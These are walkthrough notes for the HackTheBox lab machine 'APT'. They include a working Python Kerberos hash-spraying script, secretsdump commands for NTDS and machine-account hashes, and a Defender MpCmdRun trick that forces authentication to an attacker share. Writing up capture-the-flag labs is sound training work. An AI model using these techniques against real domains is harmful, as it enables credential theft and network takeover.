---
description: 'Notes for https://youtu.be/ZnUIiVwNSHk'
---

# APT

## User

### Get IPv6 Address with [https://github.com/mubix/IOXIDResolver](https://github.com/mubix/IOXIDResolver)

```text
python3 IOXIDResolver.py -t apt.htb
Address: apt
Address: 10.129.124.109
Address: dead:beef::8884:1fcc:ce90:638f
```

### Secretsdump from backup.zip

```text
secretsdump.py -system SYSTEM -security SECURITY -ntds ../Active\ Directory/ntds.dit LOCAL | tee hashes
```

### Spray Hashes 

Modified from [here](https://github.com/cube0x0/HashSpray.py/blob/master/kerbspray.py) by InfoSecJack:

```python
#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import sys
import argparse
import socket
from time import sleep
import re
from impacket.smbconnection import SMBConnection
from impacket import smbconnection
import multiprocessing
import traceback
import argparse
import sys
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import multiprocessing
import socket

def gethost_addrinfo(hostname):
    try:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET6,
                socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, canonname, sa = res
    except socket.gaierror:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET,
                socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, canonname, sa = res

    return sa[0]


def _login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    dc_ip = gethost_addrinfo(dc_ip)
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        print('[+] Success %s/%s' % (domain, username) )
        return True
    except KerberosError as e:
        return False
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
           print("[-]Could not find username: %s/%s" % (domain, username) )
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            return
        else:
            print(e)
    except socket.error as e:
        print('[-]Could not connect to DC')
        return

DOMAIN = 'htb.local'
USERNAME = 'henry.vinson'
def login(username, hash):
	return _login(username, '', DOMAIN, '', hash, None, "apt6.htb")

passwords = [x.strip() for x in open("hashes.txt").readlines()]
SLEEP_TIME = 5

for x in passwords:
	if login(USERNAME, x):
		print(f"[+] Success {x}")
		exit()
```

### Dump Remote Registry

```text
reg.py htb.local/henry.vinson@apt6.htb -hashes :*** query -keyName HKU -s | tee hku.reg
```

## Root

### Authenticate with Machine Account to our box

```text
C:\progra~1\Window~1\Mpcmdrun.exe -Scan -ScanType 3 -File '\\***\xct\xct'
```

### Secretsdump with Machine Account

```bash
secretsdump.py htb.local/'APT$'@apt6.htb -hashes :***
```

